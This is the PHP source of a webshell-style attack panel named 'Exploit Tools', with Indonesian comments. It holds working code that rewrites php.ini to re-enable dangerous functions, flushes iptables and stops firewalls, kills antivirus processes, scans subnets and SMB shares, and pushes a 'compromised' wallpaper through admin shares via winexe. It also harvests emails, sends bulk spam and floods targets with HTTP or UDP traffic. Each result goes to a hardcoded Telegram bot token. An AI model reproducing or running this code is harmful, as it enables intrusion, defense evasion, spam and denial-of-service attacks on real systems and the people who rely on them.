<?php
// ============================================================
// EXPLOIT TOOLS - FULL VERSION
// Author: Dkid03
// Fitur: PHP Settings, Firewall, AV Killer, Network Scan,
//        Admin Finder, SMB Scan, Wallpaper Changer,
//        Email Extractor, Spam Sender (PHP Mail),
//        DDoS, Webshell Scanner, File Manager
// ============================================================
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ==================== KONFIGURASI ====================
$botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
$telegramUserId = '7547598395';
define('EMERGENCY_PASSWORD', 'Dkid03Ransom!2025');
define('SESSION_TIMEOUT', 1800);
define('MAX_EXECUTION_TIME', 300);

// ==================== FUNGSI UTILITY ====================
function sendTelegramMessage($botToken, $chatId, $message) {
    if (empty($botToken) || empty($chatId) || empty($message)) return false;
    if (strlen($message) > 4096) $message = substr($message, 0, 4000) . "\n... (dipotong)";
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML', 'disable_web_page_preview' => true];
    $postData = http_build_query($data);
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        $result = curl_exec($ch);
        curl_close($ch);
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    if (ini_get('allow_url_fopen')) {
        $options = ['http' => ['header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => $postData, 'timeout' => 30], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]];
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) return true;
        }
    }
    return false;
}

function isRoot() {
    if (!function_exists('shell_exec')) return false;
    return trim(@shell_exec('whoami 2>/dev/null')) === 'root';
}

function isShellAvailable() {
    if (!function_exists('shell_exec')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    return !in_array('shell_exec', array_map('trim', $disabled));
}

function isMailAvailable() {
    if (!function_exists('mail')) return false;
    $disabled = explode(',', ini_get('disable_functions') ?: '');
    return !in_array('mail', array_map('trim', $disabled));
}

function isSafePath($path, $rootPath, $specialDirs = []) {
    $real = realpath($path);
    if ($real === false) return false;
    if (strpos($real, $rootPath) === 0) return true;
    foreach ($specialDirs as $dir) {
        if ($dir && strpos($real, $dir) === 0) return true;
    }
    return false;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function get_best_cipher() {
    $available = openssl_get_cipher_methods();
    $preference = ['chacha20-poly1305','aes-256-gcm','aes-128-gcm','aes-256-ccm'];
    foreach ($preference as $c) {
        if (in_array($c, $available)) {
            $test = @openssl_encrypt('test', $c, random_bytes(32), OPENSSL_RAW_DATA, random_bytes(12), $tag);
            if ($test !== false) return $c;
        }
    }
    return 'aes-256-cbc';
}
$cipher = get_best_cipher();

// ==================== VALIDASI INPUT ====================
function validateIp($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP);
}
function validateUrl($url) {
    return filter_var($url, FILTER_VALIDATE_URL);
}
function validateSubnet($subnet) {
    return preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}\/[0-9]{1,2}$/', $subnet);
}
function validateEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}

// ==================== FITUR 1: PHP SETTINGS CHANGER ====================
function change_php_settings() {
    $changes = [];
    $ini_file = php_ini_loaded_file();
    if (!$ini_file || !is_writable($ini_file)) {
        $paths = ['/etc/php.ini', '/usr/local/lib/php.ini', '/usr/local/php/lib/php.ini', __DIR__ . '/.user.ini'];
        foreach ($paths as $p) {
            if (file_exists($p) && is_writable($p)) {
                $ini_file = $p;
                break;
            }
        }
        if (!$ini_file || !is_writable($ini_file)) {
            $ini_file = __DIR__ . '/.user.ini';
            if (!file_exists($ini_file)) {
                @file_put_contents($ini_file, '');
                @chmod($ini_file, 0644);
            }
        }
    }
    if (!is_writable($ini_file)) {
        return ['success' => false, 'error' => "File $ini_file tidak bisa ditulis"];
    }
    $settings = [
        'disable_functions' => '',
        'allow_url_fopen' => 'On',
        'allow_url_include' => 'On',
        'display_errors' => 'On',
        'display_startup_errors' => 'On',
        'max_execution_time' => '0',
        'max_input_time' => '-1',
        'memory_limit' => '2048M',
        'upload_max_filesize' => '2048M',
        'post_max_size' => '2048M'
    ];
    $content = @file_get_contents($ini_file);
    if ($content === false) {
        return ['success' => false, 'error' => "Gagal membaca file $ini_file"];
    }
    foreach ($settings as $key => $value) {
        if (strpos($content, $key) !== false) {
            $content = preg_replace('/' . preg_quote($key) . '\s*=\s*[^\n]*/', "$key = $value", $content);
        } else {
            $content .= "\n$key = $value\n";
        }
        $changes[] = "$key = $value";
    }
    if (@file_put_contents($ini_file, $content) === false) {
        return ['success' => false, 'error' => "Gagal menulis ke file $ini_file"];
    }
    return ['success' => true, 'file' => $ini_file, 'changes' => $changes];
}

// ==================== FITUR 2: FIREWALL DISABLER ====================
function disable_firewall() {
    $results = [];
    if (!isShellAvailable()) {
        return ['success' => false, 'error' => 'shell_exec tidak tersedia'];
    }
    @shell_exec("systemctl stop firewalld 2>/dev/null");
    @shell_exec("systemctl disable firewalld 2>/dev/null");
    @shell_exec("systemctl stop ufw 2>/dev/null");
    @shell_exec("systemctl disable ufw 2>/dev/null");
    @shell_exec("iptables -F 2>/dev/null");
    @shell_exec("iptables -X 2>/dev/null");
    @shell_exec("iptables -P INPUT ACCEPT 2>/dev/null");
    @shell_exec("iptables -P FORWARD ACCEPT 2>/dev/null");
    @shell_exec("iptables -P OUTPUT ACCEPT 2>/dev/null");
    $results[] = "✅ Firewall disabled (Linux)";
    @shell_exec("netsh advfirewall set allprofiles state off 2>/dev/null");
    @shell_exec("netsh firewall set opmode disable 2>/dev/null");
    $results[] = "✅ Firewall disabled (Windows)";
    return ['success' => true, 'results' => $results];
}

// ==================== FITUR 3: ANTIVIRUS KILLER ====================
function kill_antivirus() {
    $killed = [];
    if (!isShellAvailable()) {
        return ['success' => false, 'error' => 'shell_exec tidak tersedia'];
    }
    $avs = ['clamav', 'clamscan', 'freshclam', 'sophos', 'avast', 'avg', 'bitdefender', 'kaspersky', 'eset', 'nod32', 'symantec', 'mcafee', 'trendmicro', 'panda', 'fsecure'];
    foreach ($avs as $av) {
        @shell_exec("pkill -9 $av 2>/dev/null");
        $killed[] = $av;
    }
    @shell_exec("systemctl stop clamav* 2>/dev/null");
    @shell_exec("systemctl stop sophos* 2>/dev/null");
    @shell_exec("systemctl stop avast* 2>/dev/null");
    $av_win = ['MsMpEng.exe', 'avast.exe', 'avg.exe', 'kaspersky.exe', 'eset.exe', 'nod32.exe', 'mcafee.exe', 'symantec.exe'];
    foreach ($av_win as $av) {
        @shell_exec("taskkill /F /IM $av 2>/dev/null");
    }
    return ['success' => true, 'killed' => $killed];
}

// ==================== FITUR 4: SCAN NETWORK ====================
function scan_network($subnet) {
    if (!validateSubnet($subnet)) {
        return ['success' => false, 'error' => 'Format subnet tidak valid (contoh: 192.168.1.0/24)'];
    }
    if (!isShellAvailable()) {
        return ['success' => false, 'error' => 'shell_exec tidak tersedia'];
    }
    $hosts = [];
    $ip = substr($subnet, 0, strrpos($subnet, '.'));
    $timeout = 1;
    for ($i = 1; $i <= 254; $i++) {
        $test = $ip . '.' . $i;
        $ping = @shell_exec("ping -c 1 -W $timeout $test 2>/dev/null | grep '1 received'");
        if (!empty($ping)) {
            $hostname = @gethostbyaddr($test);
            $hosts[] = ['ip' => $test, 'hostname' => $hostname ?: 'unknown', 'status' => 'online'];
        }
    }
    return ['success' => true, 'hosts' => $hosts, 'total' => count($hosts)];
}

// ==================== FITUR 5: FIND ADMIN ====================
function find_admin($hosts) {
    $keywords = ['admin', 'desktop', 'laptop', 'pc-', 'workstation', 'user', 'office', 'server'];
    $found = [];
    foreach ($hosts as $h) {
        $hostname = strtolower($h['hostname']);
        foreach ($keywords as $kw) {
            if (strpos($hostname, $kw) !== false) {
                $found[] = $h;
                break;
            }
        }
    }
    return $found;
}

// ==================== FITUR 6: SCAN SMB ====================
function scan_smb($ip) {
    if (!validateIp($ip)) {
        return ['success' => false, 'error' => 'IP tidak valid'];
    }
    if (!isShellAvailable()) {
        return ['success' => false, 'error' => 'shell_exec tidak tersedia'];
    }
    $shares = [];
    $output = @shell_exec("smbclient -L //$ip -N 2>/dev/null");
    if (empty($output)) {
        return ['success' => false, 'error' => "Tidak ada share ditemukan atau SMB tidak aktif di $ip"];
    }
    preg_match_all('/\s+([A-Za-z0-9_\-$]+)\s+Disk/i', $output, $matches);
    if (!empty($matches[1])) {
        $shares = $matches[1];
    }
    return ['success' => true, 'shares' => $shares, 'total' => count($shares)];
}

// ==================== FITUR 7: GANTI WALLPAPER ====================
function change_wallpaper($admin_ip) {
    if (!validateIp($admin_ip)) {
        return ['success' => false, 'error' => 'IP tidak valid'];
    }
    if (!function_exists('imagecreate')) {
        return ['success' => false, 'error' => 'GD Library tidak tersedia'];
    }
    $wallpaper_file = '/tmp/wallpaper_' . md5($admin_ip) . '.jpg';
    $img = imagecreate(1920, 1080);
    $bg = imagecolorallocate($img, 10, 10, 30);
    $tc = imagecolorallocate($img, 255, 0, 0);
    $tc2 = imagecolorallocate($img, 0, 255, 100);
    imagestring($img, 5, 100, 500, "🔐 YOUR SYSTEM HAS BEEN COMPROMISED!", $tc);
    imagestring($img, 5, 100, 550, "Contact: admin@" . $_SERVER['HTTP_HOST'], $tc2);
    imagestring($img, 5, 100, 600, "Server: " . $_SERVER['HTTP_HOST'], $tc2);
    imagestring($img, 5, 100, 650, "Time: " . date('Y-m-d H:i:s'), $tc2);
    imagejpeg($img, $wallpaper_file, 90);
    imagedestroy($img);
    $mount_point = '/mnt/smb_wp_' . md5($admin_ip);
    @mkdir($mount_point, 0755);
    $mount = @shell_exec("mount -t cifs -o username=guest,vers=3.0 //$admin_ip/C$ '$mount_point' 2>&1");
    if (strpos($mount, 'Permission denied') !== false || strpos($mount, 'failed') !== false) {
        @rmdir($mount_point);
        return ['success' => false, 'error' => "Gagal mount SMB share: $mount"];
    }
    if (is_dir($mount_point) && file_exists($wallpaper_file)) {
        $targets = [
            "$mount_point/Users/Public/Pictures/wallpaper.jpg",
            "$mount_point/Windows/Web/Wallpaper/wallpaper.jpg",
            "$mount_point/Windows/Web/Wallpaper/Windows/wallpaper.jpg"
        ];
        $copied = false;
        foreach ($targets as $t) {
            @mkdir(dirname($t), 0755, true);
            if (@copy($wallpaper_file, $t)) {
                $copied = true;
            }
        }
        if ($copied) {
            $reg = "REG ADD \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"C:\\Windows\\Web\\Wallpaper\\wallpaper.jpg\" /f\n";
            $reg .= "REG ADD \"HKCU\\Control Panel\\Desktop\" /v WallpaperStyle /t REG_SZ /d 2 /f\n";
            $reg .= "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\n";
            @file_put_contents($mount_point . '/set_wp.bat', $reg);
            @shell_exec("winexe -U guest //$admin_ip 'cmd /c C:\\set_wp.bat' 2>&1");
        }
        @shell_exec("umount $mount_point 2>/dev/null");
        @rmdir($mount_point);
        @unlink($wallpaper_file);
        if ($copied) {
            return ['success' => true, 'ip' => $admin_ip];
        } else {
            return ['success' => false, 'error' => 'Gagal copy wallpaper'];
        }
    }
    @shell_exec("umount $mount_point 2>/dev/null");
    @rmdir($mount_point);
    @unlink($wallpaper_file);
    return ['success' => false, 'error' => 'Gagal mount atau file tidak ditemukan'];
}

// ==================== FITUR 8: EMAIL EXTRACTOR ====================
function extract_emails($url) {
    if (!validateUrl($url)) {
        return ['success' => false, 'error' => 'URL tidak valid'];
    }
    $emails = [];
    $content = @file_get_contents($url);
    if ($content === false) {
        return ['success' => false, 'error' => "Gagal mengakses $url"];
    }
    preg_match_all('/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/', $content, $matches);
    $emails = array_unique($matches[0]);
    preg_match_all('/<a\s+href="([^"]+)"/i', $content, $links);
    foreach ($links[1] as $link) {
        if (strpos($link, 'http') === 0 && strpos($link, $url) !== false) {
            $sub = @file_get_contents($link);
            if ($sub) {
                preg_match_all('/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/', $sub, $sub_matches);
                $emails = array_merge($emails, $sub_matches[0]);
            }
        }
    }
    $emails = array_unique($emails);
    return ['success' => true, 'emails' => $emails, 'total' => count($emails)];
}

// ==================== FITUR 9: SPAM SENDER (PHP MAIL) ====================
function send_spam_php_mail($to, $subject, $message, $from = '') {
    if (!isMailAvailable()) return false;
    if (!validateEmail($to)) return false;
    if (empty($from)) $from = 'admin@' . $_SERVER['HTTP_HOST'];
    $headers = "From: $from\r\nReply-To: $from\r\nX-Mailer: PHP/" . phpversion() . "\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n";
    return @mail($to, $subject, $message, $headers);
}

function send_spam_bulk_php($emails, $subject, $message, $from = '') {
    $sent = 0; $failed = 0;
    $valid_emails = array_filter($emails, function($e) { return filter_var($e, FILTER_VALIDATE_EMAIL); });
    if (empty($valid_emails)) {
        return ['success' => false, 'error' => 'Tidak ada email valid'];
    }
    foreach ($valid_emails as $email) {
        if (send_spam_php_mail($email, $subject, $message, $from)) $sent++;
        else $failed++;
        usleep(300000);
    }
    return ['success' => true, 'sent' => $sent, 'failed' => $failed, 'total' => count($valid_emails)];
}

// ==================== FITUR 10: TEST PHP MAIL ====================
function test_php_mail($to, $from = '') {
    if (!isMailAvailable()) return ['success' => false, 'error' => 'mail() function tidak tersedia'];
    if (!validateEmail($to)) return ['success' => false, 'error' => 'Email tujuan tidak valid'];
    if (empty($from)) $from = 'admin@' . $_SERVER['HTTP_HOST'];
    $subject = "🔧 Test Mail from Exploit Tools";
    $message = "This is a test email from exploit tools.\n\nServer: " . $_SERVER['HTTP_HOST'] . "\nTime: " . date('Y-m-d H:i:s') . "\nIP: " . ($_SERVER['SERVER_ADDR'] ?? 'unknown') . "\n\nIf you receive this, mail() function is working!";
    $headers = "From: $from\r\nReply-To: $from\r\nX-Mailer: PHP/" . phpversion() . "\r\n";
    $result = @mail($to, $subject, $message, $headers);
    if ($result) return ['success' => true, 'message' => "✅ Test email sent to $to"];
    else return ['success' => false, 'error' => '❌ Gagal mengirim test email. Cek konfigurasi mail().'];
}

// ==================== FITUR 11: DDOS ====================
function ddos_attack($target, $type = 'http', $duration = 30) {
    if (!validateUrl($target) && !validateIp($target)) {
        return ['success' => false, 'error' => 'Target tidak valid (IP atau URL)'];
    }
    if ($duration < 1 || $duration > 300) {
        return ['success' => false, 'error' => 'Durasi harus 1-300 detik'];
    }
    $end = time() + $duration;
    $counter = 0;
    if ($type === 'http') {
        while (time() < $end) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $target);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 1);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
            curl_close($ch);
            $counter++;
        }
    } else {
        $ip = parse_url($target, PHP_URL_HOST) ?: $target;
        $port = 80;
        while (time() < $end) {
            $sock = @fsockopen("udp://$ip", $port, $errno, $errstr, 1);
            if ($sock) {
                @fwrite($sock, str_repeat("X", 65500));
                @fclose($sock);
                $counter++;
            }
        }
    }
    return ['success' => true, 'requests' => $counter, 'duration' => $duration, 'type' => $type, 'target' => $target];
}

// ==================== FITUR 12: SCAN WEBSHELL ====================
function scan_webshell($path = '') {
    if (empty($path)) $path = __DIR__;
    if (!is_dir($path)) return ['success' => false, 'error' => 'Path tidak valid'];
    $patterns = [
        '/\b(eval|assert|system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec)\s*\(/i',
        '/\b(base64_decode|gzuncompress|gzinflate|str_rot13)\s*\(/i',
        '/\b(\$_GET|\$_POST|\$_REQUEST|\$_COOKIE|\$_FILES)\s*\[/i',
        '/<\?php\s*\$/',
        '/\b(file_put_contents|fopen|fwrite|fclose)\s*\(/i',
        '/\b(chmod|chown|chgrp)\s*\(/i',
        '/\b(unlink|rmdir|mkdir|rename|copy)\s*\(/i',
        '/WSO/','/c99/','/r57/','/shell/','/backdoor/','/Dkid03/','/b374k/','/phpSpy/','/Crystal/','/shelp/','/WebAdmin/','/C99Shell/','/R57Shell/'
    ];
    $extensions = ['php', 'phtml', 'php5', 'php7', 'phar', 'inc', 'txt'];
    $found = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS));
    foreach ($iterator as $file) {
        if ($file->isFile()) {
            $ext = strtolower($file->getExtension());
            if (!in_array($ext, $extensions)) continue;
            $filepath = $file->getPathname();
            $size = $file->getSize();
            $content = @file_get_contents($filepath);
            if ($content === false) continue;
            $score = 0;
            $matched_patterns = [];
            foreach ($patterns as $pattern) {
                if (preg_match($pattern, $content)) {
                    $score++;
                    $matched_patterns[] = $pattern;
                }
            }
            if ($size > 100000 && $size < 10000000) $score++;
            if (strpos($content, 'base64_decode') !== false && strlen($content) > 5000) $score += 2;
            if ($score > 0) {
                $found[] = [
                    'path' => $filepath,
                    'size' => formatSize($size),
                    'score' => $score,
                    'patterns' => $matched_patterns,
                    'modified' => date('Y-m-d H:i:s', $file->getMTime())
                ];
            }
        }
    }
    usort($found, function($a, $b) { return $b['score'] - $a['score']; });
    return ['success' => true, 'files' => $found, 'total' => count($found)];
}

// ==================== LOGIN ====================
$loginError = $loginSuccess = '';
if (isset($_GET['action']) && $_GET['action'] === 'Dkid') {
    if (isset($_POST['login_password'])) {
        $input = $_POST['password'] ?? '';
        if ($input === EMERGENCY_PASSWORD) {
            $_SESSION['loggedin'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ?');
            exit;
        } else {
            $loginError = "❌ Password salah.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html><head><meta charset="UTF-8"><title>Exploit Tools</title>
    <style>body{background:#0a0f1e;color:#00ff9d;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;}.login-box{background:#111;padding:2rem;border:2px solid #00ff9d;border-radius:10px;width:350px;}input,button{width:100%;padding:10px;margin:10px 0;background:#1e293b;border:1px solid #00ff9d;color:#00ff9d;}button:hover{background:#00ff9d;color:#000;}.error{color:#ff0055;}</style></head>
    <body><div class="login-box"><h2>🔓 Login Darurat</h2><?php if ($loginError) echo "<div class='error'>$loginError</div>"; ?><form method="post"><input type="password" name="password" placeholder="Password Darurat" required><button type="submit" name="login_password">Login</button></form><p><a href="?">Kembali</a></p></div></body></html>
    <?php exit;
}
if (isset($_POST['request_otp'])) {
    $otp = sprintf("%06d", mt_rand(0, 999999));
    $_SESSION['otp'] = $otp;
    $_SESSION['otp_time'] = time();
    sendTelegramMessage($botToken, $telegramUserId, "🔑 Kode OTP: <code>$otp</code> (5 menit)");
    $loginSuccess = "✅ OTP dikirim ke Telegram.";
}
if (isset($_POST['verify_otp'])) {
    $input = trim($_POST['otp'] ?? '');
    if (empty($input)) {
        $loginError = "❌ Masukkan kode OTP.";
    } elseif (!isset($_SESSION['otp']) || !isset($_SESSION['otp_time'])) {
        $loginError = "❌ Minta OTP dulu.";
    } elseif (time() - $_SESSION['otp_time'] > 300) {
        $loginError = "❌ Kode kadaluarsa.";
        unset($_SESSION['otp'], $_SESSION['otp_time']);
    } elseif ($input === $_SESSION['otp']) {
        $_SESSION['loggedin'] = true;
        $_SESSION['login_time'] = time();
        unset($_SESSION['otp'], $_SESSION['otp_time']);
        header('Location: ?');
        exit;
    } else {
        $loginError = "❌ Kode OTP salah.";
    }
}

// ==================== HANDLER GET ====================
if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] < SESSION_TIMEOUT) {
    
    // 1. PHP Settings
    if (isset($_GET['change_php'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $result = change_php_settings();
        $msg = $result['success'] ? "⚡ PHP settings changed in: " . $result['file'] . "\n" . implode("\n", $result['changes']) : "❌ " . $result['error'];
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 2. Firewall
    if (isset($_GET['disable_firewall'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $result = disable_firewall();
        $msg = $result['success'] ? "🔥 " . implode("\n", $result['results']) : "❌ " . $result['error'];
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 3. AV Killer
    if (isset($_GET['kill_av'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $result = kill_antivirus();
        $msg = $result['success'] ? "🛡️ Antivirus killed: " . (empty($result['killed']) ? 'none' : implode(', ', $result['killed'])) : "❌ " . $result['error'];
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 4. Scan Network
    if (isset($_GET['scan_network'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $subnet = $_GET['subnet'] ?? '192.168.1.0/24';
        $result = scan_network($subnet);
        if ($result['success']) {
            $msg = "🌐 Network scan results ($subnet):\n";
            foreach ($result['hosts'] as $h) { $msg .= "- " . $h['ip'] . " (" . $h['hostname'] . ")\n"; }
            $msg .= "\nTotal: " . $result['total'] . " hosts";
        } else { $msg = "❌ " . $result['error']; }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 5. Find Admin
    if (isset($_GET['find_admin'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $subnet = $_GET['subnet'] ?? '192.168.1.0/24';
        $scan = scan_network($subnet);
        if (!$scan['success']) { $msg = "❌ " . $scan['error']; } else {
            $admins = find_admin($scan['hosts']);
            if (empty($admins)) { $msg = "💻 Tidak ada admin ditemukan di $subnet"; } else {
                $msg = "💻 Admin found:\n";
                foreach ($admins as $a) { $msg .= "- " . $a['ip'] . " (" . $a['hostname'] . ")\n"; }
            }
        }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 6. Scan SMB
    if (isset($_GET['scan_smb'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $ip = $_GET['ip'] ?? '';
        if (empty($ip)) { $msg = "❌ IP required"; } else {
            $result = scan_smb($ip);
            if ($result['success']) {
                $msg = "📂 SMB shares on $ip:\n" . implode("\n", array_map(function($s) { return "- $s"; }, $result['shares']));
                $msg .= "\n\nTotal: " . $result['total'] . " shares";
            } else { $msg = "❌ " . $result['error']; }
        }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 7. Change Wallpaper
    if (isset($_GET['change_wallpaper'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $ip = $_GET['ip'] ?? '';
        if (empty($ip)) { $msg = "❌ IP required"; } else {
            $result = change_wallpaper($ip);
            if ($result['success']) { $msg = "🖥️ Wallpaper PC Admin ($ip) telah diganti!"; } else { $msg = "❌ " . $result['error']; }
        }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 8. Email Extractor
    if (isset($_GET['extract_emails'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $url = $_GET['url'] ?? '';
        if (empty($url)) { $msg = "❌ URL required"; } else {
            $result = extract_emails($url);
            if ($result['success']) {
                $msg = "📧 " . $result['total'] . " emails found from $url:\n" . implode("\n", $result['emails']);
            } else { $msg = "❌ " . $result['error']; }
        }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 9. Spam Sender (PHP Mail)
    if (isset($_GET['send_spam_php'])) {
        set_time_limit(MAX_EXECUTION_TIME + 120);
        $to = $_GET['to'] ?? '';
        $subject = $_GET['subject'] ?? 'System Alert';
        $msg_content = $_GET['msg'] ?? 'Your system has been compromised! Contact admin immediately.';
        $from = $_GET['from'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
        if (empty($to)) { $msg = "❌ To email required"; } else {
            if (!isMailAvailable()) { $msg = "❌ mail() function tidak tersedia."; } else {
                $emails = explode(',', $to);
                $result = send_spam_bulk_php($emails, $subject, $msg_content, $from);
                if ($result['success']) { $msg = "📨 Spam sent to " . $result['sent'] . " recipients (" . $result['failed'] . " failed)"; } else { $msg = "❌ " . $result['error']; }
            }
        }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 10. Test PHP Mail
    if (isset($_GET['test_php_mail'])) {
        set_time_limit(MAX_EXECUTION_TIME);
        $to = $_GET['to'] ?? '';
        $from = $_GET['from'] ?? 'admin@' . $_SERVER['HTTP_HOST'];
        if (empty($to)) { $msg = "❌ Email tujuan required"; } else {
            $result = test_php_mail($to, $from);
            if ($result['success']) { $msg = $result['message']; } else { $msg = "❌ " . $result['error']; }
        }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 11. DDoS
    if (isset($_GET['ddos'])) {
        set_time_limit(MAX_EXECUTION_TIME + 60);
        $target = $_GET['target'] ?? '';
        $type = $_GET['type'] ?? 'http';
        $duration = (int)($_GET['duration'] ?? 30);
        if (empty($target)) { $msg = "❌ Target required"; } else {
            $result = ddos_attack($target, $type, $duration);
            if ($result['success']) {
                $msg = "🔥 DDoS started to " . $result['target'] . " (" . $result['type'] . ") for " . $result['duration'] . " seconds\n📊 Requests sent: " . $result['requests'];
            } else { $msg = "❌ " . $result['error']; }
        }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 12. Scan Webshell
    if (isset($_GET['scan_webshell'])) {
        set_time_limit(300);
        $path = $_GET['path'] ?? __DIR__;
        $result = scan_webshell($path);
        if ($result['success']) {
            $msg = "🔍 *Webshell Scan Results*\n\n📁 Path: $path\n📊 Total files scanned: " . $result['total'] . "\n\n";
            if (empty($result['files'])) { $msg .= "✅ Tidak ditemukan file mencurigakan."; } else {
                foreach ($result['files'] as $i => $f) {
                    if ($i >= 20) { $msg .= "\n... and " . (count($result['files']) - 20) . " more files"; break; }
                    $msg .= "🔴 *" . basename($f['path']) . "*\n   📂 " . dirname($f['path']) . "\n   📦 " . $f['size'] . " | Score: " . $f['score'] . "\n   🕐 " . $f['modified'] . "\n\n";
                }
            }
        } else { $msg = "❌ " . $result['error']; }
        sendTelegramMessage($botToken, $telegramUserId, $msg);
        echo nl2br($msg);
        exit;
    }
    
    // 13. View File
    if (isset($_GET['view_file']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
        $file = $_GET['file'] ?? '';
        if (empty($file) || !file_exists($file) || !is_file($file)) { echo "❌ File tidak ditemukan"; exit; }
        if (!isSafePath($file, __DIR__, [])) { echo "❌ Akses ditolak"; exit; }
        $content = file_get_contents($file);
        echo "<pre style='background:#0a0f1e;color:#00ff9d;padding:10px;font-family:monospace;font-size:0.8rem;max-height:500px;overflow:auto;'>" . htmlspecialchars($content) . "</pre>";
        exit;
    }
    
    // 14. Delete File
    if (isset($_GET['delete_file']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
        $file = $_GET['file'] ?? '';
        if (empty($file) || !file_exists($file) || !is_file($file)) { echo "❌ File tidak ditemukan"; exit; }
        if (!isSafePath($file, __DIR__, [])) { echo "❌ Akses ditolak"; exit; }
        echo @unlink($file) ? "✅ File dihapus: " . basename($file) : "❌ Gagal menghapus file";
        exit;
    }
    
    // 15. Download File
    if (isset($_GET['download_file']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
        $file = $_GET['file'] ?? '';
        if (empty($file) || !file_exists($file) || !is_file($file)) { die("❌ File tidak ditemukan"); }
        if (!isSafePath($file, __DIR__, [])) { die("❌ Akses ditolak"); }
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ==================== HTML PANEL ====================
if (!isset($_SESSION['loggedin']) || time() - $_SESSION['login_time'] > SESSION_TIMEOUT) { ?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Exploit Tools</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{background:#0a0f1e;color:#00ff9d;font-family:monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.container{background:#111;padding:2rem;border:2px solid #00ff9d;border-radius:10px;width:400px;text-align:center;}
input,button{width:100%;padding:10px;margin:10px 0;background:#1e293b;border:1px solid #00ff9d;color:#00ff9d;}
button:hover{background:#00ff9d;color:#000;}
.error{color:#ff0055;}
.success{color:#00ff9d;}
